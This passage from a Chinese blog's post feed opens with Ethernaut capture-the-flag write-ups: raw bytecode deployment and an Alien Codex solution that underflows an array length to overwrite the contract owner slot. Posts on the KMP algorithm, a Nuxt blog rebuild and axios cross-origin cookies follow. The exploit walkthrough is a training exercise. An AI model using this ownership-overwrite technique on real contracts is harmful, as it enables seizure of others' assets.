<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">偏移    汇编指令对应二进制（16进制）实际汇编指令</span><br><span class="line">0000    600a            	PUSH1 0x0a</span><br><span class="line">0002    600c            	PUSH1 0x0c</span><br><span class="line">0004    6000            	PUSH1 0x00</span><br><span class="line">0006    39              	CODECOPY</span><br><span class="line">0007    600a            	PUSH1 0x0a</span><br><span class="line">0009    6000            	PUSH1 0x00</span><br><span class="line">000B    F3              	RETURN</span><br><span class="line">000C    602a                 PUSH1 0x2a</span><br><span class="line">000E    6050                 PUSH1 0x50</span><br><span class="line">0010    52                   mstore</span><br><span class="line">0011    6020                 PUSH1 0x20</span><br><span class="line">0013    6050                 PUSH1 0x50</span><br><span class="line">0015    F3                   RETURN</span><br></pre></td></tr></table></figure>

<p>即<code>600a600c600039600a6000F3602a60505260206050F3</code>是我们要部署的内容。</p>
<p>我们在控制台输入一下代码即可：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">byteCode = <span class="string">"600a600c600039600a6000F3602a60505260206050F3"</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.sendTransaction(&#123;<span class="attr">from</span>: player, <span class="attr">data</span>: byteCode&#125;)</span><br><span class="line"><span class="comment">// 将会返回contract地址，假设为0x01</span></span><br><span class="line"><span class="keyword">await</span> contract.setSolver(<span class="string">'0x01'</span>)</span><br></pre></td></tr></table></figure>

<p>然后提交即可。</p>
<h2 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;helpers&#x2F;Ownable-05.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function make_contact() public &#123;</span><br><span class="line">    contact &#x3D; true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) contacted public &#123;</span><br><span class="line">    codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function retract() contacted public &#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) contacted public &#123;</span><br><span class="line">    codex[i] &#x3D; _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：获得合约所有权。</p>
<p>乍一看上去，没有修改合约所有权的函数，实际上，该合约继承了<code>Ownable</code>合约，该合约可以<a href="https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol" target="_blank" rel="noopener">【此】</a>查看，实际上，就算我们不查看该合约，我们也可以依次在控制台输入一下代码，查看相关存储布局：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="string">"0"</span>)</span><br><span class="line"><span class="keyword">await</span> contract.make_contact()</span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="string">"0"</span>)</span><br></pre></td></tr></table></figure>

<p>就会发现，实际上该合约的存储结构中，第一个<code>slot</code>的布局如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--------------------------------------------------------------</span><br><span class="line">|      unused(11)      |contact(1) |        owner (20)       | &lt;- slot 0</span><br><span class="line">--------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>再次查看<code>revise</code>函数，支持写入<code>codex</code>的某个位置，我们还注意到<code>retract</code>函数，是直接将动态长度减去1，实际上<code>slodity</code>这里并没有对动态数组长度做<strong>溢出检查</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">await contract.retract()</span><br><span class="line">await web3.eth.getStorageAt(instance, &quot;1&quot;)</span><br><span class="line"># return &#39;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>slot 1 存储的是动态数组codex的长度，关于动态数组中元素的位置，参照<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html" target="_blank" rel="noopener">【官网文档-状态变量在储存中的布局】</a></p>
</blockquote>
<p>由于我们的<code>codex</code>变量目前是和<code>slot 1</code>相关联，而动态数组的元素存储位置会从 <code>keccak256(p)</code> 开始，<code>p</code>是<code>slot index</code>，本关卡是1，此外， 它的布局方式与静态大小的数组相同。一个元素接着一个元素。</p>
<p>我们借助remix，写个计算<code>keccak256</code>的函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract T &#123;</span><br><span class="line">    function keccak256Helper(uint p) public pure returns(bytes32 res) &#123;</span><br><span class="line">        res &#x3D; keccak256(abi.encodePacked(p));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keccak256(1)&#x3D;0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span><br></pre></td></tr></table></figure>

<p>该地址即为<code>codex</code>中元素的起始地址</p>
<p>借助<code>python</code>，我们可以计算一个偏移地址，使得偏移后的地址指向0，即：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hex(<span class="number">2</span>**<span class="number">256</span> - <span class="number">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span>)</span><br><span class="line">             <span class="number">0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</span></span><br></pre></td></tr></table></figure>

<p>我们调用<code>revise</code>函数，并将偏移地址设置成上述地址：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.revise(<span class="string">'0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a'</span>, <span class="string">'0x000000000000000000000000'</span> + player.substr(<span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<p>然后我们可以确认我们已经成功获得所有权：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner() == player</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>串的模式匹配算法之KMP算法</title>
    <url>/2020/11/27/%E4%B8%B2%E7%9A%84%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95%E4%B9%8BKMP%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>子串的定位操作通常称做串的<strong>模式匹配</strong>，是各种串处理系统中最重要的操作之一。</p>
<p>模式串<code>T</code>: 子串</p>
<p>主串<code>S</code>：源串</p>
<h2 id="暴力法"><a href="#暴力法" class="headerlink" title="暴力法"></a>暴力法</h2><p>最容易想到的就是利用回溯的思想进行暴力求解：<a id="more"></a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// O(n*m)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getIndex</span><span class="params">(<span class="keyword">char</span> *S, <span class="keyword">char</span> *T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, SLength = <span class="built_in">strlen</span>(S), TLength = <span class="built_in">strlen</span>(T);</span><br><span class="line">    <span class="keyword">while</span> (i &lt; SLength &amp;&amp; j &lt; TLength) &#123;</span><br><span class="line">        <span class="keyword">if</span> (S[i] == T[j]) &#123;</span><br><span class="line">            i++, j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 回溯指针</span></span><br><span class="line">            i = i - j + <span class="number">1</span>;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j &gt;= TLength) <span class="keyword">return</span> i - TLength;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面不足之处在于每次遇到不匹配的时候，指针总是回溯到上次的起点的下一个位置，例如下面的情况(<code>S=ababcabcacbab</code>   <code>T=abcac</code>)，<code>i=6, j =4</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">S:a b a b c a b c a c b a b</span><br><span class="line">T:    a b c a c</span><br></pre></td></tr></table></figure>

<p>按照暴力法，下次<code>i=i - j + 1=3, j =0</code>，但是我们经过思考，发现模式串的下标为<code>0</code>的元素是和下标为<code>3</code>的元素是相同的，那我们往后尝试匹配的过程中，只要未成功，就一定会出现下面的情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">S:a b a b c a b c a c b a b</span><br><span class="line">T:          a b c a c</span><br></pre></td></tr></table></figure>

<p>那我们完全可以不同时回溯指针<code>i</code>和<code>j</code>，直接将模式串往后移动<code>3</code>个单位进行匹配</p>
<p>利用这种“部分匹配”的特性，我们可以在遇到不匹配的时候，不将指针<code>i</code>回溯，而是尽量将模式串往右“滑动”特定单位长度进行继续匹配。</p>
<p>关键是移动的长度该如何求解？</p>
<h2 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h2><p>该算法由<code>D.E.Knuth</code>和<code>V.R.Pratt</code>和<code>J.H.Morris</code>同时发现的，人们称之为克努特-莫斯里-普拉特操作，简称<code>KMP</code>算法。该算法能将时间复杂度降到<code>O(n+m)</code></p>
<p>该算法关键在于求解<code>next[]</code>，若令<code>next[i]=j</code>，则表示模式串中第<code>i</code>个字符与主串中相对应字符不匹配的时候，在模式串中需要重新和主串中该字符进行比较的字符的位置。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getNext</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">int</span> *next)</span> </span>&#123;</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>, i = <span class="number">0</span>, length = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line">        j = next[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; str[j] != str[i]) &#123;</span><br><span class="line">            j = next[j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (str[i] == str[j]) &#123;</span><br><span class="line">            next[i] = j + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            next[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">KMP</span><span class="params">(<span class="keyword">char</span> *S, <span class="keyword">char</span> *T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> next[MAXLEN];</span><br><span class="line">    getNext(T, next);</span><br><span class="line">    <span class="keyword">int</span> SLength = <span class="built_in">strlen</span>(S), TLength = <span class="built_in">strlen</span>(T);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; SLength; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; S[i] != T[j]) &#123;</span><br><span class="line">            j = next[j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (S[i] == T[j]) &#123;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j == TLength) &#123;</span><br><span class="line">            <span class="keyword">return</span> i - j + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>字符串</tag>
        <tag>KMP</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Nuxt改造博客前端</title>
    <url>/2022/05/07/%E4%BD%BF%E7%94%A8Nuxt%E6%94%B9%E9%80%A0%E5%8D%9A%E5%AE%A2%E5%89%8D%E7%AB%AF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>是的，没错，我又来对我的博客系统下手了！回想起2020年，第一次使用<a href="https://hexo.io/zh-cn/index.html" target="_blank" rel="noopener">hexo</a>搭建的静态博客，那是我对博客系统的初体验，当时搭建完毕后，到处找插件，找主题，心情也很激动，因为这是我的第一个网站，当时熬夜搭建网站的激动现在仍然可以体会得到！</p>
<a id="more"></a>

<p>后来慢慢地接触到了动态博客的概念，进一步了解到了<a href="http://typecho.org/" target="_blank" rel="noopener">typecho</a>，为了搭建它，我自己开始租借服务器，开启了玩转服务器之旅。</p>
<p>使用了<code>typecho</code>大概半年以后，逐渐感受到许多不便，特别是该博客使用的是<code>PHP</code>语言开发的，我没有接触过，也暂时不想接触，想要实现某些自定义功能的时候，无从下手。</p>
<p>于是，出于程序员的理念：</p>
<blockquote>
<p>当你觉得某个东西不好用的时候，那你就自己造它。</p>
</blockquote>
<p>我决定自己开干！自己编写一个博客系统！</p>
<p>口号喊得虽然很响，但是激情过后就是无尽的迷茫，自己根本无从下手，但是自己立下的誓言含泪也要完成吧！然后自己在在网上找了很多搭建博客的教程，但是要么就是没有文档，要么就是就给了截图，源码都不提供。不过我也能理解，几乎没有人愿意将从零搭建博客的过程全都记录下来吧，那样子太费时间了。</p>
<p>直到后来，在哔哩哔哩上面找到了李仁密老师的<a href="https://www.bilibili.com/video/BV13t411T72J" target="_blank" rel="noopener">小而美的博客</a>教程，上面详细介绍了如何使用<code>SpringBoot</code>搭建个人博客，然后我就跟着作者一行一行地敲代码，不过到后面我逐渐明白了怎么搭建以后，有一些代码就跟作者不一样了，不过<code>90%</code>左右的代码还是和作者一样的。</p>
<p>时间来到了21年年初，我又开始接触到了前后端分离的概念，觉得这玩意挺新奇的，我就萌发了改造博客的想法，不过要改的话，要改的地方有很多，主要是涉及前端页面的都要重新做，但是我的审美一直不在线，最后设计出来的页面差强人意。然后前端使用<code>Vue</code>和<code>Element-UI</code>,后端之前根据李仁密老师的教程，持久层使用的是<code>Hibernate</code>,然后我这次使用的是<code>Mybatis</code>,其他的思想沿用之前的想法。不过改完以后，有一个致命的弱点，那就是首页访问速度贼慢！而且如果我们尝试在浏览器中查看源码，我们获取到的就是只有一堆<code>js</code>文件，这样子就非常不利于搜索引擎，也就是说如果我不将我的博客链接发出去，那么就几乎不可能有人找得到我的博客。我原本写博客就是为了想分享一下自己的学习心得，或者和其他人一起交流，改造博客以后搜索引擎都不来我这了，这就违背了我的初衷，这也为我后面改造博客埋下伏笔。</p>
<h2 id="改造之路"><a href="#改造之路" class="headerlink" title="改造之路"></a>改造之路</h2><p>经过一年的使用后，我渐渐觉得博客系统还是需要一定的访问量，不然不好意思说是博客系统，然后我就比对了一下<code>Vue</code>项目进行服务端渲染的方案，最终选定使用<code>Nuxt</code>改造。</p>
<p>确定以后，就可以上手了，我之前编写的代码中，很多页面的请求数据都是放在<code>created()</code>函数中，但是在<code>Nuxt</code>框架下，该函数会在客户端和服务端各执行一次，这不是我想要的，因此主要工作是将请求数据的代码放在了<code>asyncData()</code>函数中。</p>
<p>还好我之前写的前端都是按照模块化开发，很多功能都是按照组件来进行开发，如此一来，改造起来就快很多了。</p>
<p>还好我之前使用的是前后端分离模式，后端就只需要提供接口，改造起来，后端一行代码也不需要更改。</p>
<h2 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h2><p>虽然改造起来比较简单，但是有些代码也并不是一帆风顺，也到了很多坑，还好自己或多或少找到了解决方案。</p>
<ul>
<li><p>错误一：地址栏刷新<code>/home</code>的时候，后台控制台报<code>status</code> 未定义，但是刷新</p>
<p><code>/</code>是可以的（我的之前代码逻辑是：输入<code>/</code>时候，路由直接跳转到<code>/home</code>）</p>
<p>解决方案：设置跨域代理，即先安装好<code>axios</code>:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install @nuxtjs/axios -s</span><br></pre></td></tr></table></figure>

<p>接着在项目的根目录下中<code>plugins</code>中新建<code>axios.js</code>文件，输入以下内容：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> &#123; Message &#125; <span class="keyword">from</span> <span class="string">"element-ui"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; MessageBox &#125; <span class="keyword">from</span> <span class="string">"element-ui"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> (<span class="params">&#123;store, route, redirect, $axios,req&#125;</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Error拦截器：出现错误的时候被调用，根据状态码做对应判断并显示全局Message</span></span><br><span class="line">    $axios.onError(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// console.log('erro statusr =', error.response.status);</span></span><br><span class="line">      <span class="keyword">switch</span> (<span class="built_in">parseInt</span>(error.response.status)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">400</span>: Message(&#123;</span><br><span class="line">					showClose: <span class="literal">true</span>,</span><br><span class="line">					message: <span class="string">'发送数据错误'</span>,</span><br><span class="line">					type: <span class="string">"error"</span></span><br><span class="line">        &#125;);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">402</span>: Message(&#123;</span><br><span class="line">					showClose: <span class="literal">true</span>,</span><br><span class="line">					message: <span class="string">'江湖中查无此人！'</span>,</span><br><span class="line">					type: <span class="string">"error"</span></span><br><span class="line">        &#125;);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">          <span class="comment">// 密码错误</span></span><br><span class="line">				<span class="keyword">case</span> <span class="number">403</span>: Message(&#123;</span><br><span class="line">					showClose: <span class="literal">true</span>,</span><br><span class="line">					message: <span class="string">'密令错误！'</span>,</span><br><span class="line">					type: <span class="string">"error"</span></span><br><span class="line">				&#125;);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// 密码错误</span></span><br><span class="line">				<span class="keyword">case</span> <span class="number">405</span>: Message(&#123;</span><br><span class="line">					showClose: <span class="literal">true</span>,</span><br><span class="line">					message: <span class="string">'口令错误！'</span>,</span><br><span class="line">					type: <span class="string">"error"</span></span><br><span class="line">				&#125;);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">480</span>: <span class="comment">// 未登录</span></span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'480!!'</span>);</span><br><span class="line">          redirect(redirectURL(route,req))</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">500</span>: Message(&#123;</span><br><span class="line">					showClose: <span class="literal">true</span>,</span><br><span class="line">					message: <span class="string">'后端出错'</span>,</span><br><span class="line">					type: <span class="string">"error"</span></span><br><span class="line">				&#125;); <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// Response拦截器：对正常返回的数据进行处理</span></span><br><span class="line">    $axios.onResponse(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> response.data </span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取重定向地址</span></span><br><span class="line"><span class="keyword">const</span> redirectURL = <span class="function">(<span class="params">route,req</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 客户端</span></span><br><span class="line">  <span class="keyword">if</span>(process.client) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'/admin/login'</span></span><br><span class="line">  &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'/admin/login'</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在<code>nuxt.config.js</code>中配置<code>axios</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> plugins: [</span><br><span class="line">   &#123;</span><br><span class="line">     src: <span class="string">'~/plugins/axios'</span>,</span><br><span class="line">     <span class="string">'ssr'</span>: <span class="literal">true</span> <span class="comment">// 服务端渲染</span></span><br><span class="line">  &#125;,</span><br><span class="line"> buildModules: [</span><br><span class="line">   <span class="string">'@nuxtjs/axios'</span>,</span><br><span class="line"> ],</span><br><span class="line"> modules: [</span><br><span class="line">   <span class="string">'@nuxtjs/axios'</span>,</span><br><span class="line">   <span class="string">'@nuxtjs/proxy'</span>,</span><br><span class="line"> ],</span><br><span class="line"> axios: &#123;</span><br><span class="line">   <span class="comment">// Workaround to avoid enforcing hard-coded localhost:3000: https://github.com/nuxt-community/axios-module/issues/308</span></span><br><span class="line">   proxy: <span class="literal">true</span>, <span class="comment">// 开启跨域行为</span></span><br><span class="line">   prefix: <span class="string">'/api'</span>, <span class="comment">// 配置基本得url地址</span></span><br><span class="line">   credentials: <span class="literal">true</span></span><br><span class="line"> &#125;,</span><br><span class="line">     <span class="comment">// 配置代理</span></span><br><span class="line"> proxy: &#123;</span><br><span class="line">   <span class="string">'/api'</span>: &#123;</span><br><span class="line">       target: <span class="string">'http://localhost:8080/api/'</span>,</span><br><span class="line">       ws: <span class="literal">false</span>,</span><br><span class="line">       changeOrigin: <span class="literal">true</span>,</span><br><span class="line">       pathRewrite: &#123;</span><br><span class="line">           <span class="string">'^/api'</span>: <span class="string">''</span>,</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
</li>
<li><p>我的项目中用了<code>echarts</code>，但是我就仅仅用来热力图组件，不想把整个<code>echarts</code>项目安装进我的项目，就想着怎么按需引入。后来在某个地方找到官方定制的<a href="https://echarts.apache.org/zh/builder.html" target="_blank" rel="noopener">网站</a>，在上面的网站选后组件以后，直接下载<code>js</code>文件，然后就按照文档教程，在需要引入的地方引入：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">// .vue 文件中：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> echarts <span class="keyword">from</span> <span class="string">"~/assets/js/echarts.min.js"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line">    mounted()&#123;</span><br><span class="line">        echarts.init(...);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>有的时候<code>node</code>服务端报<code>window is not defined</code></p>
<p>解决方案：有些代码会在服务端和客户端中都执行一遍，但是在服务端中，是没有<code>window</code>这个对象的，因此要在代码中加一个判断是在哪个端的语句：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果是客户端</span></span><br><span class="line"> <span class="keyword">if</span> (process.client) &#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在组件中引用自定义的<code>css</code>文件总是失效。</p>
<p>解决方法：原先按照<code>vue</code>的方式，引用方式为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">import</span> <span class="string">"~/assets/css/blog.css"</span></span><br></pre></td></tr></table></figure>

<p>这个方法似乎在<code>Nuxt</code>框架下不行，要换成以下方式引用：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line">        head()&#123;</span><br><span class="line"><span class="actionscript">    		<span class="keyword">return</span>&#123;</span></span><br><span class="line">      			link: [</span><br><span class="line"><span class="javascript">        			&#123;<span class="attr">rel</span>: <span class="string">'stylesheet'</span>, <span class="attr">href</span>: 									<span class="built_in">require</span>(<span class="string">'~/assets/css/blog.css'</span>)&#125;</span></span><br><span class="line">      			]</span><br><span class="line">    		&#125;</span><br><span class="line">  		&#125;,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总得来说，改造起来困难不是很大，加上<code>vue</code>的生态的确很好，很多问题都可以找得到解决方案，目前改造后的系统：</p>
</li>
<li><input checked disabled type="checkbox"> <p>支持页面动画，改善用户体验</p>
</li>
<li><input checked disabled type="checkbox"> <p>全站的站内链接均使用<code>nuxt-link</code>方式，加快页面切换以及避免相同路由切换时报错，而且还有利于<code>SEO</code></p>
</li>
<li><input checked disabled type="checkbox"> <p>后台登陆支持验证码，增加安全性，之前的是输入正确的用户名和密码以后就可以登录了，安全性不是很大（==虽然验证码也没有加多少安全性==）</p>
</li>
<li><input checked disabled type="checkbox"> <p>后台markdown解析增加高亮语法、删除线语法，<del>就是这样子</del>，这个插件官方没有，应该是太简单做了，我对照着原有的插件就做出来了。</p>
</li>
<li><input checked disabled type="checkbox"> <p>支持公式：如这是西塔$\theta$,下面是公式<br>$$<br>y=\sum_{i=0}^{n}x_i<br>$$</p>
</li>
<li></li>
</ul>
<p>未来<strong>可能</strong>进一步完善的方向：</p>
<ul>
<li><input disabled type="checkbox"> 恢复文章下的评论组件，为什么叫恢复呢，因为之前的是支持的，但是我改造以后，回复按钮的绑定事件一直不触发，当时调了一天都没有调出来，调到自闭。</li>
<li><input disabled type="checkbox"> 支持夜间模式，这个好像挺难的，不好实现，有可能最终不实现了，哈哈哈哈哈哈哈哈哈。</li>
</ul>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Nuxt</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>使用axios+tomcat HttpServlet处理跨域请求以及处理cookie</title>
    <url>/2020/12/17/%E4%BD%BF%E7%94%A8axios-tomcat-HttpServlet%E5%A4%84%E7%90%86%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E4%BB%A5%E5%8F%8A%E5%A4%84%E7%90%86cookie/</url>
    <content><![CDATA[<h2 id="前因"><a href="#前因" class="headerlink" title="前因"></a>前因</h2><p>有一个需求，前端通过<code>axios</code>发送用户名和密码到后台，后台查询数据库后，确认合法用户后直接把信息存进<code>session</code>里边，而为了实现这个 需求，就需要前端解决跨域，并且将cookie存到本地计算机中。<a id="more"></a></p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>首先是通过代理实现跨域请求：前端发送<code>url:http://localhost:8081/beforeLogin</code>，访问到<code>http://localhost:8080/testJson4servlet/beforeLogin</code></p>
<p>参照广大网友的步骤：在和<code>package.json</code>同级目录下新建配置文件<code>vue.config.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vue.config.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line"></span><br><span class="line">    devServer: &#123;</span><br><span class="line">        port: <span class="number">8081</span>,</span><br><span class="line">        proxy: &#123;</span><br><span class="line">            <span class="string">'/api'</span>: &#123;</span><br><span class="line"></span><br><span class="line">                target: <span class="string">'http://localhost:8080/testJson4servlet/'</span>,</span><br><span class="line">                ws: <span class="literal">false</span>,</span><br><span class="line">                changeOrigin: <span class="literal">true</span>,</span><br><span class="line">                pathRewrite: &#123;</span><br><span class="line">                    <span class="string">'^/api'</span>: <span class="string">''</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        disableHostCheck: <span class="literal">true</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>main.js</code>中配置全局<code>axios</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Axios <span class="keyword">from</span> <span class="string">'axios'</span></span><br><span class="line">Vue.use(ElementUI);</span><br><span class="line"></span><br><span class="line">Vue.prototype.$axios = Axios;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span></span><br><span class="line">Axios.defaults.withCredentials = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

